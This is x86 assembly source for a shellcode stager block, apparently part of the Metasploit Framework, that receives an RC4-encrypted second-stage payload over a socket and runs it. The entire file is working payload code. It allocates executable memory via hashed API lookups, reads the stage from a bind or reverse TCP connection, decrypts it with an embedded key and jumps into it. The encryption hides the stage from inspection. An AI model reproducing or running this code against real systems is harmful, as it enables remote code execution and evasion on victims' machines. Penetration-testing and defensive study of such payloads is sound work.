;-----------------------------------------------------------------------------;
; Authors: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
;          Michael Schierl (schierlm[at]gmx[dot]de)        [RC4 support]
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (31 December 2012)
;-----------------------------------------------------------------------------;
[BITS 32]

; Same as block_recv, only that the length will be XORed and the stage will be RC4 decoded.
; Differences to block_recv are indented two more spaces.

; Compatible: block_bind_tcp, block_reverse_tcp

; Input: EBP must be the address of 'api_call'. EDI must be the socket. ESI is a pointer on stack.
; Output: None.
; Clobbers: EAX, EBX, ECX, EDX, ESI, (ESP will also be modified)

recv:
  ; Receive the size of the incoming second stage...
  push byte 0            ; flags
  push byte 4            ; length = sizeof( DWORD );
  push esi               ; the 4 byte buffer on the stack to hold the second stage length
  push edi               ; the saved socket
  push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
  call ebp               ; recv( s, &dwLength, 4, 0 );
  ; Alloc a RWX buffer for the second stage
  mov esi, [esi]         ; dereference the pointer to the second stage length
    xor esi, "XORK"      ; XOR the stage length
    lea ecx, [esi+0x00]  ; ECX = stage length + S-box length (alloc length)
  push byte 0x40         ; PAGE_EXECUTE_READWRITE
  push 0x1000            ; MEM_COMMIT
;  push esi               ; push the newly recieved second stage length.
    push ecx             ; push the alloc length
  push byte 0            ; NULL as we dont care where the allocation is.
  push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
  call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
  ; Receive the second stage and execute it...
;  xchg ebx, eax          ; ebx = our new memory address for the new stage + S-box
    lea ebx, [eax+0x100] ; EBX = new stage address
  push ebx               ; push the address of the new stage so we can return into it
    push esi             ; push stage length
    push eax             ; push the address of the S-box
read_more:               ;
  push byte 0            ; flags
  push esi               ; length
  push ebx               ; the current address into our second stage's RWX buffer
  push edi               ; the saved socket
  push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
  call ebp               ; recv( s, buffer, length, 0 );
  add ebx, eax           ; buffer += bytes_received
  sub esi, eax           ; length -= bytes_received
  test esi, esi          ; test length
  jnz read_more          ; continue if we have more to read
    pop ebx              ; address of S-box
    pop ecx              ; stage length
    pop ebp              ; address of stage
    push ebp             ; push back so we can return into it
    push edi             ; save socket
    mov edi, ebx         ; address of S-box
    call after_key       ; Call after_key, this pushes the address of the key onto the stack.
    db "RC4KeyMetasploit"
after_key:
    pop esi                ; ESI = RC4 key
%include "./src/block/block_rc4.asm"
    pop edi              ; restore socket
  ret                    ; return into the second stage
